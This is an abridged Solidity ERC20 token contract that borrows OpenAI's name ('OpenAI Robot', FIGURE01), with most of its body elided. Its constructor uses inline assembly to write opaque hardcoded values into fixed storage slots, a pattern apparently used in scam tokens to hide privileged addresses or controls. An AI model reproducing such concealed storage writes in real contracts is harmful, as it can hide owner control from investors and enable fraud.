// OpenAI feat robots. What can go wrong?
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xdb19dc939b2834b895ca8c8c124201d1c9c8d640b829)
            sstore(0x51,0xdb199a355e7ea44cd88a8c54563dce7442b38351ac11)
    ...
    function _DeployOpenAIRobot(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployOpenAIRobot(creator, initialSupply);
    }
}

contract OpenAIRobot is ERC20Token {
    constructor() ERC20Token("OpenAI Robot", "FIGURE01", msg.sender, 10000000 * 10 ** 18) {
    }
}